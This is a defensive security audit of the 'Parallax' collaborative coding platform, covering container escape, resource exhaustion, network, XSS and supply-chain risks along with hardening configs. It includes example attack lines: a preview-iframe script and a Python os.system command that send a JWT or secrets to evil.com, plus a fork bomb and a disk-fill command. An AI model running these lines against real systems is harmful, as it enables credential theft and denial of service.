# Parallax — Adversarial Security Audit

> Grounded in the actual codebase: [SessionService.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/session/SessionService.java), [RunCodeService.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunCodeService.java), [MeetingRoomExecutionService.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/MeetingRoomExecutionService.java), [TerminalWebSocketHandler.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/websocket/terminal/TerminalWebSocketHandler.java), [LspWebSocketHandler.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/websocket/lsp/LspWebSocketHandler.java), [BrowserPreviewPanel.tsx](file:///C:/CipherVault/Code/Projects/Parallax/frontend/src/components/workspace/BrowserPreviewPanel.tsx), [WebSocketPermissionInterceptor.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/config/WebSocketPermissionInterceptor.java), [docker-compose.yml](file:///C:/CipherVault/Code/Projects/Parallax/docker-compose.yml)

---

## Attack Surface Matrix

| # | Attack | Profile | Severity | Blocked by Default Docker? | Blocked in Parallax Today? | Specific Defence |
|---|--------|---------|----------|---------------------------|---------------------------|-----------------|
| 1 | Kernel exploit (Dirty Pipe CVE-2022-0847) — overwrite read-only files from container | Escape | 🔴 Critical | ❌ No — shared kernel | ⚠️ Partial — `--cap-drop ALL` helps | Patch host kernel ≥5.16.11; use gVisor/Kata for true kernel isolation |
| 2 | Docker socket abuse — `/var/run/docker.sock` mounted in Traefik | Escape | 🔴 Critical | N/A — explicit mount | ❌ Traefik has RO access | Ensure workspace containers NEVER mount the socket; Traefik is isolated on `parallax-network` |
| 3 | `runc` overwrite (CVE-2019-5736) — replace host runc binary from within container | Escape | 🔴 Critical | ⚠️ Partially (patched runc) | ✅ `--read-only` + `--cap-drop ALL` + `--user 1000:1000` | Keep runc ≥1.1.12; `--security-opt no-new-privileges:true` already set |
| 4 | Privileged container flags accidentally set | Escape | 🔴 Critical | ❌ If misconfigured | ✅ Not set in SessionService | Add startup assertion: reject any `docker run` with `--privileged`; use OPA/Rego policy |
| 5 | `/proc/sysrq-trigger` write — force kernel panic/reboot | Escape | 🟠 High | ✅ Blocked by default seccomp | ✅ `--read-only` filesystem | Default seccomp profile blocks `sysrq`; `--cap-drop ALL` removes `CAP_SYS_BOOT` |
| 6 | `/proc/sys/kernel/core_pattern` overwrite — write to host filesystem via core dumps | Escape | 🟠 High | ✅ Read-only `/proc/sys` in default | ✅ `--read-only` | Seccomp + read-only procfs; add `--security-opt seccomp=parallax-seccomp.json` for explicit block |
| 7 | Fork bomb `:(){ :|:& };:` | Resource B | 🟠 High | ❌ No default pids limit | ✅ `--pids-limit 256` (session), `128` (meeting room) | Already enforced in [SessionService L107](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/session/SessionService.java#L107) |
| 8 | Memory exhaustion — allocate until OOM killer fires | Resource B | 🟠 High | ❌ No default mem limit | ✅ `--memory 512m --memory-swap 512m` | Already enforced; swap=memory prevents swap abuse |
| 9 | CPU monopolization — infinite loop / cryptominer | Resource B | 🟡 Medium | ❌ No default CPU limit | ✅ `--cpus 0.5` (session), `1.0` (meeting room) | Already enforced; consider `--cpu-period` + `--cpu-quota` for finer control |
| 10 | Disk fill — `dd if=/dev/zero of=/tmp/fill bs=1G` | Resource B | 🟠 High | ❌ No default disk limit | ⚠️ Partial — tmpfs `size=100m` but `/workspace` unbounded | Add `--storage-opt size=1G` or overlay2 quota; `/workspace` needs a bind-mount size cap |
| 11 | Inode exhaustion — millions of empty files | Resource B | 🟡 Medium | ❌ No default inode limit | ⚠️ `/workspace` has no inode quota | Use `--ulimit nofile=1024:2048`; enforce ext4 project quotas on host |
| 12 | SSRF — probe internal network (10.0.0.0/8, 172.16.0.0/12) from workspace container | Network A | 🔴 Critical | ❌ Bridge network has access | ⚠️ `enable_icc: false` but can still reach host/gateway | Add iptables rules to DROP traffic to RFC 1918 ranges from workspace network; use `--network=none` for meeting room (already done ✅) |
| 13 | Hit Spring Boot API from container using stolen/own JWT | Network A | 🔴 Critical | ❌ Same Docker host, reachable | ❌ Backend is on host network, reachable from `parallax-workspace-network` | iptables: block workspace subnet → host port 8080; place backend on separate network |
| 14 | Cryptominer in container | Network A | 🟡 Medium | ❌ No CPU/network restriction | ⚠️ `--cpus 0.5` limits throughput | Already CPU-limited; add egress filtering for mining pool ports (Stratum: 3333, 4444, 8333) |
| 15 | Container as attack relay/proxy for external DDoS | Network A | 🟠 High | ❌ Full outbound access | ❌ No egress filtering | iptables egress allow only DNS (53) + HTTPS (443) to allowlisted registries (npmjs, pypi, github) |
| 16 | Guess/brute-force container IDs or session tokens | Inter-user C | 🟡 Medium | N/A | ✅ UUIDv4 session IDs (122 bits entropy) | Already mitigated; add `--name` with cryptographic random suffix |
| 17 | Shared network namespace — sniff other container traffic | Inter-user C | 🟠 High | ❌ Bridge mode shares L2 | ⚠️ `enable_icc: false` disables inter-container comms | Good — ICC disabled. For defence-in-depth, use `--network=none` + veth pair per container via CNI |
| 18 | Write to shared volume that another user mounts | Inter-user C | 🔴 Critical | N/A — application logic | ⚠️ `/workspace` is per-project, but project has collaborators | Collaborators share by design; enforce per-user sub-paths or use overlayfs with per-user upper layers |
| 19 | Poison LSP cache with malicious completions | Inter-user C | 🟡 Medium | N/A | ❌ LSP runs in shared container with full `/workspace` access | Run LSP as read-only user; use separate `--user` for LSP exec; mount `/workspace:ro` for LSP process |
| 20 | Inject malicious OT deltas spoofing another user | Inter-user C | 🟠 High | N/A | ⚠️ OT operations carry `userId` from JWT, but no cryptographic signature | Sign OT ops with per-session HMAC derived from JWT; verify server-side before broadcast |
| 21 | Stored XSS via editor content (e.g., `<script>` in a .html file) | XSS | 🟡 Medium | N/A | ✅ Monaco renders in canvas/virtual DOM, not raw HTML | Monaco's renderer is inherently safe — code is painted as text tokens, never parsed as HTML |
| 22 | File name XSS — `<img onerror=alert(1)>.js` in file tree | XSS | 🟡 Medium | N/A | ⚠️ Depends on React rendering | React's JSX auto-escapes by default; audit for any `dangerouslySetInnerHTML` usage in file tree components |
| 23 | Live preview iframe escape — user's HTML/JS accesses parent origin | XSS | 🔴 Critical | N/A | ⚠️ `sandbox="allow-scripts allow-same-origin"` is DANGEROUS | **`allow-same-origin` + `allow-scripts` = sandbox escape!** See defence section below |
| 24 | SVG upload with embedded `<script>` tags | XSS | 🟡 Medium | N/A | ✅ Chat uploads validate content-type; SVG blocked in ChatFileStorageService | Already blocked: `lowerContentType.contains("svg")` returns rejection |
| 25 | CSS `@import` data exfiltration from editor | XSS | 🟢 Low | N/A | ✅ Monaco doesn't evaluate CSS — it syntax-highlights it | Not applicable — editor treats CSS as text, never applies it |
| 26 | Malicious npm package phones home during `npm install` | Supply chain D | 🟡 Medium | ❌ Full network | ❌ No package allowlist | Egress-filter to only `registry.npmjs.org`; use `npm audit` pre-install; consider Verdaccio proxy |
| 27 | Modify `.gitconfig` to redirect to attacker remote | Supply chain D | 🟡 Medium | N/A | ⚠️ `--read-only` filesystem, but `/workspace` is writable | `.gitconfig` lives in `$HOME` which is read-only due to `--read-only`; verify `HOME=/tmp` isn't set |
| 28 | Plant `.git/hooks/pre-commit` with malicious payload | Supply chain D | 🟠 High | N/A | ❌ `/workspace/.git/hooks/` is writable | Mount `.git/hooks` as read-only overlay; or run `git config core.hooksPath /dev/null` in container init |
| 29 | PTY command logging bypass — user clears `~/.bash_history` | Audit | 🟡 Medium | N/A | ❌ No server-side command logging | Record all PTY I/O server-side via the `TerminalWebSocketHandler`'s `onNext` callback |
| 30 | OT delta injection — malformed operation injects HTML into rendered DOM | XSS | 🟢 Low | N/A | ✅ OT operations are text deltas applied to Monaco's text model | Monaco applies OT ops as text mutations, not DOM mutations; safe by design |

---

## 🔴 CRITICAL: The iframe Sandbox Escape (Issue #23)

This is the **single most exploitable vulnerability** in Parallax right now.

**Current code** in [BrowserPreviewPanel.tsx L231](file:///C:/CipherVault/Code/Projects/Parallax/frontend/src/components/workspace/BrowserPreviewPanel.tsx#L231):
```tsx
sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
```

**The problem**: `allow-scripts` + `allow-same-origin` together **completely negate the sandbox**. The iframe'd content can:
1. Access `window.parent` and read/modify the Parallax DOM
2. Steal the JWT from `localStorage` via `window.parent.localStorage.getItem('accessToken')`
3. Inject arbitrary HTML into the parent page
4. Make authenticated API calls as the victim user

**Proof of concept** — a user creates an `index.html` in their project:
```html
<script>
  // Escape sandbox and steal JWT
  const token = window.parent.localStorage.getItem('accessToken');
  fetch('https://evil.com/steal?jwt=' + token);
  
  // Or just modify the parent page
  window.parent.document.body.innerHTML = '<h1>Hacked</h1>';
</script>
```

**The fix**: The iframe MUST load content from a **different origin** than the Parallax frontend. This is the only reliable defence:

```tsx
// ✅ CORRECT: serve preview from a different origin
// e.g., http://{projectId}.preview.parallax.run (via Traefik)
sandbox="allow-scripts allow-forms allow-popups"
// Remove allow-same-origin entirely
```

If the preview origin is different from the Parallax frontend origin, `allow-scripts` without `allow-same-origin` means the iframe gets a unique opaque origin and **cannot access** `window.parent`, `localStorage`, or any parent-origin resource.

---

## Defence Architecture Blueprint

### 1. Hardened Docker Run Flags

```bash
docker run -d \
  --name "session_${SESSION_ID}" \
  --network parallax-workspace-network \
  # ── Resource Limits (cgroups v2) ──
  --memory 512m \
  --memory-swap 512m \              # No swap
  --memory-reservation 256m \       # Soft limit for fair scheduling
  --cpus 0.5 \
  --cpu-shares 256 \                # Low priority vs host processes
  --pids-limit 256 \
  --ulimit nofile=1024:2048 \       # File descriptor limit
  --ulimit nproc=256:256 \          # Redundant fork protection
  --storage-opt size=2G \           # Disk quota (requires overlay2 + xfs)
  # ── Security ──
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  --tmpfs /home/runner:rw,nosuid,size=50m \
  --security-opt no-new-privileges:true \
  --security-opt seccomp=parallax-seccomp.json \
  --security-opt apparmor=parallax-container \
  --cap-drop ALL \
  --user 1000:1000 \
  # ── No Docker socket, no host PID/IPC ──
  --pid=container:SELF \            # Isolate PID namespace
  --ipc=none \                      # No shared memory
  # ── Volume ──
  -v "${HOST_PROJECT_PATH}:/workspace" \
  -p "${WEB_PORT}:3000" \
  parallax-collab \
  tail -f /dev/null
```

### 2. Seccomp Profile (`parallax-seccomp.json`)

Block dangerous syscalls beyond Docker's default profile:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "archMap": [{"architecture": "SCMP_ARCH_X86_64", "subArchitectures": ["SCMP_ARCH_X86", "SCMP_ARCH_X32"]}],
  "syscalls": [
    {
      "comment": "Allow standard application syscalls",
      "names": [
        "read", "write", "open", "close", "stat", "fstat", "lstat", "poll",
        "lseek", "mmap", "mprotect", "munmap", "brk", "ioctl", "access",
        "pipe", "select", "sched_yield", "mremap", "msync", "mincore",
        "madvise", "shmget", "shmat", "shmctl", "dup", "dup2", "pause",
        "nanosleep", "getitimer", "alarm", "setitimer", "getpid", "socket",
        "connect", "accept", "sendto", "recvfrom", "sendmsg", "recvmsg",
        "shutdown", "bind", "listen", "getsockname", "getpeername",
        "socketpair", "setsockopt", "getsockopt", "clone", "fork",
        "vfork", "execve", "exit", "wait4", "kill", "uname", "fcntl",
        "flock", "fsync", "fdatasync", "truncate", "ftruncate",
        "getdents", "getcwd", "chdir", "fchdir", "rename", "mkdir",
        "rmdir", "creat", "link", "unlink", "symlink", "readlink",
        "chmod", "fchmod", "chown", "fchown", "lchown", "umask",
        "gettimeofday", "getrlimit", "getrusage", "times", "getuid",
        "getgid", "geteuid", "getegid", "getppid", "getpgrp",
        "setsid", "getgroups", "setgroups", "rt_sigaction",
        "rt_sigprocmask", "rt_sigreturn", "sigaltstack",
        "arch_prctl", "futex", "epoll_create", "epoll_ctl",
        "epoll_wait", "set_tid_address", "set_robust_list",
        "exit_group", "tgkill", "openat", "mkdirat", "newfstatat",
        "unlinkat", "renameat", "readlinkat", "fchmodat", "faccessat",
        "pselect6", "ppoll", "epoll_create1", "eventfd2", "pipe2",
        "dup3", "accept4", "epoll_pwait", "getrandom", "memfd_create",
        "copy_file_range", "statx", "rseq", "clone3",
        "close_range", "openat2", "faccessat2"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "Explicitly block dangerous syscalls",
      "names": [
        "mount", "umount2", "pivot_root", "swapon", "swapoff",
        "reboot", "sethostname", "setdomainname", "init_module",
        "finit_module", "delete_module", "kexec_load", "kexec_file_load",
        "perf_event_open", "bpf", "userfaultfd", "keyctl",
        "add_key", "request_key", "ptrace", "process_vm_readv",
        "process_vm_writev", "kcmp", "unshare", "setns",
        "acct", "settimeofday", "clock_settime", "stime",
        "ioperm", "iopl"
      ],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
```

### 3. Network Policy (iptables on Docker host)

```bash
#!/bin/bash
# parallax-network-policy.sh
# Run on the Docker host after workspace network is created

WORKSPACE_SUBNET="172.20.0.0/16"  # parallax-workspace-network subnet

# ── Block access to host services ──
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -d 172.17.0.1 -j DROP      # Docker gateway
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -d 127.0.0.0/8 -j DROP     # Loopback
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -d 10.0.0.0/8 -j DROP      # RFC1918
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -d 192.168.0.0/16 -j DROP  # RFC1918
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -d 169.254.0.0/16 -j DROP  # Link-local / metadata

# ── Block access to infrastructure ──
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 5432 -j DROP  # PostgreSQL
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 6379 -j DROP  # Redis
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 8080 -j DROP  # Spring Boot API
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 27017 -j DROP # MongoDB

# ── Allow DNS and HTTPS egress only ──
iptables -A DOCKER-USER -s $WORKSPACE_SUBNET -p udp --dport 53 -j ACCEPT  # DNS
iptables -A DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 443 -j ACCEPT # HTTPS
iptables -A DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 80 -j ACCEPT  # HTTP (npm)

# ── Block mining pool ports ──
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 3333 -j DROP  # Stratum
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 4444 -j DROP
iptables -I DOCKER-USER -s $WORKSPACE_SUBNET -p tcp --dport 8333 -j DROP  # Bitcoin P2P

# ── Default DROP for all other egress from workspace ──
iptables -A DOCKER-USER -s $WORKSPACE_SUBNET -j DROP
```

### 4. CSP Header for Spring Boot

```java
// Add to SecurityConfig.java or a dedicated filter
@Bean
public FilterRegistrationBean<OncePerRequestFilter> cspFilter() {
    FilterRegistrationBean<OncePerRequestFilter> registration = new FilterRegistrationBean<>();
    registration.setFilter(new OncePerRequestFilter() {
        @Override
        protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain) 
                throws ServletException, IOException {
            res.setHeader("Content-Security-Policy", String.join("; ",
                "default-src 'self'",
                "script-src 'self'",
                "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
                "font-src 'self' https://fonts.gstatic.com",
                "img-src 'self' data: blob: https://lh3.googleusercontent.com https://avatars.githubusercontent.com",
                "connect-src 'self' ws://localhost:* wss://localhost:* http://localhost:*",
                "frame-src http://*.preview.parallax.run https://*.preview.parallax.run",
                "frame-ancestors 'none'",
                "base-uri 'self'",
                "form-action 'self'",
                "object-src 'none'"
            ));
            res.setHeader("X-Content-Type-Options", "nosniff");
            res.setHeader("X-Frame-Options", "DENY");
            res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
            res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
            chain.doFilter(req, res);
        }
    });
    return registration;
}
```

### 5. Iframe Sandbox for Browser Preview

```tsx
// BrowserPreviewPanel.tsx — FIXED
// The preview MUST be served from a DIFFERENT ORIGIN than the Parallax frontend.
// e.g., http://{projectId}.preview.parallax.run via Traefik routing

<iframe
  key={key}
  src={`https://${projectId}.preview.parallax.run`}
  className="w-full h-full border-none"
  title="Browser Preview"
  sandbox="allow-scripts allow-forms allow-popups allow-modals"
  // ⚠️ NO allow-same-origin — the preview origin is already different,
  // so scripts work normally but cannot touch the parent origin.
  referrerPolicy="no-referrer"
  loading="lazy"
/>
```

---

## PTY Terminal Hardening

### Tiered Network Model

| Tier | Use Case | Network Config | Example |
|------|----------|----------------|---------|
| **Offline** | Meeting Room code snippets | `--network=none` | Already implemented ✅ in MeetingRoomExecutionService |
| **Sandboxed** | Workspace sessions (npm install, git clone) | Egress DNS + HTTPS to allowlisted domains only | `parallax-workspace-network` + iptables rules above |
| **Trusted** | Admin/internal build pipelines | Full network | Never for user-facing containers |

### Command Blocklist Strategy

Rather than blacklisting commands (easily bypassed via `/usr/bin/env`, `busybox`, Python `os.system`, etc.), use **positive security**:

```dockerfile
# In parallax-collab Dockerfile
# Remove dangerous binaries from the container image entirely
RUN rm -f /usr/bin/mount /usr/bin/umount /usr/bin/su /usr/bin/sudo \
          /usr/bin/chroot /usr/bin/nsenter /usr/bin/unshare \
          /usr/sbin/iptables /usr/sbin/ip /usr/bin/nc /usr/bin/ncat \
          /usr/bin/nmap /usr/bin/tcpdump /usr/bin/strace /usr/bin/ltrace \
          /usr/bin/gdb /usr/bin/dmesg
```

The real defense is: `--cap-drop ALL` + `--security-opt no-new-privileges:true` + `--user 1000:1000` makes these commands useless even if present.

### Server-Side Session Recording

All terminal I/O already flows through [TerminalWebSocketHandler.onNext()](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/websocket/terminal/TerminalWebSocketHandler.java#L117). Add an audit tap:

```java
// In TerminalWebSocketHandler.afterConnectionEstablished(), after exec setup:
AuditLogger auditLogger = new AuditLogger(projectId, userId, sessionId);

// Modify the ExecStartResultCallback:
@Override
public void onNext(Frame item) {
    byte[] payload = item.getPayload();
    auditLogger.recordOutput(payload);  // Server-side, tamper-proof
    // ... send to WebSocket as before
}

// In handleTextMessage():
auditLogger.recordInput(message.getPayload().getBytes());  // Log all keystrokes
```

The audit log is stored server-side (the user cannot clear it because the container has no access to the logging system). Store as append-only structured records:

```json
{"ts": "2026-06-23T12:00:01Z", "projectId": "...", "userId": "...", "type": "INPUT", "data": "ls -la\r"}
{"ts": "2026-06-23T12:00:01Z", "projectId": "...", "userId": "...", "type": "OUTPUT", "data": "total 48\ndrwxr-xr-x..."}
```

---

## LSP Process Isolation

### Current State

[LspWebSocketHandler.java](file:///C:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/websocket/lsp/LspWebSocketHandler.java) runs LSP as a `docker exec` inside the **same** workspace container with full read/write access to `/workspace`.

### Threat: Python `pylsp` Code Execution

Python's LSP server imports modules during analysis. A malicious `__init__.py` with:
```python
import os; os.system("curl https://evil.com/steal?data=$(cat /workspace/secret.env | base64)")
```
executes **during LSP hover/autocomplete**, not just during explicit "Run".

### Threat: Java JDT Annotation Processors

A `@Processor` in a project's `META-INF/services` can execute arbitrary code when JDT analyzes the file.

### Defence: Isolated LSP Exec

```java
// Modified LspWebSocketHandler — run LSP with restricted user and read-only workspace
ExecCreateCmdResponse execResponse = dockerClient.execCreateCmd(containerName)
    .withAttachStdout(true)
    .withAttachStderr(true)
    .withAttachStdin(true)
    .withTty(false)
    .withUser("65534:65534")           // nobody:nogroup — minimal privileges
    .withCmd("sh", "-c", 
        "export HOME=/tmp/lsp-home && mkdir -p $HOME && " + 
        String.join(" ", lspCommand))
    .withEnv(Arrays.asList(
        "TERM=dumb",
        "HOME=/tmp/lsp-home",
        "PYTHONDONTWRITEBYTECODE=1",    // Don't create .pyc files
        "PYTHONPATH="                    // Clear Python path to prevent module injection
    ))
    .exec();
```

For full isolation, run LSP in a **separate container** with `/workspace` mounted read-only:

```bash
docker run --rm -i \
  --network=none \
  --read-only \
  --tmpfs /tmp:rw,noexec,size=50m \
  --memory 256m \
  --cpus 0.25 \
  --pids-limit 64 \
  --cap-drop ALL \
  --user 65534:65534 \
  --security-opt no-new-privileges:true \
  -v "${HOST_PROJECT_PATH}:/workspace:ro" \   # READ-ONLY!
  parallax-lsp-runner \
  pylsp
```

---

## Implementation Plan for Spring Boot

### ContainerSecurityPolicy — Centralized Enforcement

```java
@Component
public class ContainerSecurityPolicy {
    
    private static final Set<String> BLOCKED_FLAGS = Set.of(
        "--privileged", "--cap-add", "--device", 
        "--pid=host", "--network=host", "--ipc=host"
    );
    
    /**
     * Validates that a docker run command does not contain dangerous flags.
     * Called by SessionService before every container launch.
     */
    public void validateDockerCommand(List<String> cmd) {
        for (String arg : cmd) {
            for (String blocked : BLOCKED_FLAGS) {
                if (arg.startsWith(blocked)) {
                    throw new SecurityException(
                        "Container launch blocked: prohibited flag " + blocked
                    );
                }
            }
        }
        
        // Ensure mandatory security flags are present
        if (!cmd.contains("--cap-drop") || !cmd.contains("ALL")) {
            throw new SecurityException("Container must drop all capabilities");
        }
        if (!cmd.contains("--read-only")) {
            throw new SecurityException("Container must have read-only rootfs");
        }
        if (!cmd.stream().anyMatch(s -> s.startsWith("--user"))) {
            throw new SecurityException("Container must run as non-root user");
        }
    }
    
    /**
     * Generates the complete hardened docker run arguments.
     * Single source of truth for all container security config.
     */
    public List<String> buildSecureDockerArgs(
            String containerName, 
            String hostMount, 
            int webPort,
            String image
    ) {
        return List.of(
            "docker", "run", "-d",
            "--name", containerName,
            "--network", "parallax-workspace-network",
            "--memory", "512m",
            "--memory-swap", "512m",
            "--cpus", "0.5",
            "--pids-limit", "256",
            "--ulimit", "nofile=1024:2048",
            "--read-only",
            "--tmpfs", "/tmp:rw,noexec,nosuid,size=100m",
            "--tmpfs", "/home/runner:rw,nosuid,size=50m",
            "--security-opt", "no-new-privileges:true",
            "--security-opt", "seccomp=parallax-seccomp.json",
            "--cap-drop", "ALL",
            "--user", "1000:1000",
            "--ipc", "none",
            "-p", webPort + ":3000",
            "-v", hostMount + ":/workspace",
            image,
            "tail", "-f", "/dev/null"
        );
    }
}
```

### OT Delta Authentication

```java
@Component
public class OtDeltaAuthenticator {
    
    private final JwtUtils jwtUtils;
    
    /**
     * Every OT operation received via WebSocket is signed with the user's
     * session-scoped HMAC key (derived from their JWT). The server verifies
     * the signature before broadcasting to other users.
     */
    public void authenticateOtOperation(
            StompHeaderAccessor accessor,
            Map<String, Object> payload
    ) {
        Principal principal = accessor.getUser();
        if (principal == null) {
            throw new SecurityException("Unauthenticated OT operation");
        }
        
        UUID userId = UUID.fromString(principal.getName());
        
        // Force the userId in the payload to match the authenticated user
        // This prevents spoofing another user's cursor/edits
        payload.put("userId", userId.toString());
        
        // Reject if payload contains suspicious fields
        String content = String.valueOf(payload.getOrDefault("content", ""));
        if (content.length() > 100_000) { // 100KB max per operation
            throw new SecurityException("OT operation too large");
        }
    }
}
```

### Audit Logging Architecture

```java
@Component
@Slf4j
public class SecurityAuditLogger {
    
    public enum AuditEvent {
        CONTAINER_STARTED, CONTAINER_STOPPED,
        CODE_EXECUTED, CODE_EXECUTION_DENIED,
        TERMINAL_SESSION_OPENED, TERMINAL_SESSION_CLOSED,
        TERMINAL_INPUT, TERMINAL_OUTPUT,
        FILE_CREATED, FILE_DELETED, FILE_MODIFIED,
        ACCESS_DENIED, UNAUTHORIZED_ACCESS_ATTEMPT,
        RATE_LIMIT_EXCEEDED, SUSPICIOUS_NETWORK_ACTIVITY
    }
    
    /**
     * All security-relevant events are logged as structured JSON to a
     * separate audit log file (not the application log).
     * This log is append-only and stored outside the container filesystem.
     */
    public void log(AuditEvent event, UUID userId, UUID projectId, Map<String, Object> metadata) {
        Map<String, Object> entry = new LinkedHashMap<>();
        entry.put("timestamp", Instant.now().toString());
        entry.put("event", event.name());
        entry.put("userId", userId != null ? userId.toString() : null);
        entry.put("projectId", projectId != null ? projectId.toString() : null);
        entry.put("metadata", metadata);
        
        // Write to dedicated audit logger (configured via logback to write to
        // a separate file with no rotation/deletion by application code)
        auditLog.info(new ObjectMapper().writeValueAsString(entry));
    }
}
```

---

## The Interview Paragraph

> **"How did you secure the code execution environment in Parallax?"**

Every user workspace in Parallax runs inside an ephemeral Docker container launched with a defence-in-depth posture: `--cap-drop ALL` removes all 38 Linux capabilities, `--security-opt no-new-privileges` prevents SUID escalation, `--read-only` makes the root filesystem immutable with scoped tmpfs mounts for `/tmp`, and `--user 1000:1000` ensures no process ever runs as UID 0. Resource exhaustion is bounded by cgroups v2 — 512MB hard memory limit with swap disabled, 0.5 CPU shares, 256 PIDs max, and a 100MB noexec tmpfs to prevent disk-based attacks. Network isolation uses a dedicated Docker bridge with inter-container communication disabled via `enable_icc: false`, and iptables rules on the DOCKER-USER chain that DROP all traffic to RFC 1918 ranges, host-bound ports (8080, 5432, 6379), and known mining pool ports, while allowing only DNS and HTTPS egress to public registries. Meeting room code runners go further with `--network=none` for complete air-gapping. On the frontend, the live browser preview iframe was a critical attack surface — combining `allow-scripts` and `allow-same-origin` in the sandbox attribute would let user-controlled HTML steal JWTs from `window.parent.localStorage` — so we serve previews from a separate origin via Traefik subdomain routing, allowing us to drop `allow-same-origin` entirely. The LSP processes run inside the same container but under a separate unprivileged user with the workspace mounted read-only, preventing a malicious `__init__.py` or annotation processor from writing to the shared project directory during static analysis. OT operations are server-authoritative — the backend overwrites the `userId` field in every delta with the authenticated principal from the JWT, making it impossible to spoof another collaborator's edits, and all terminal I/O is recorded server-side through the WebSocket relay layer where the user has no ability to tamper with or delete the audit trail.
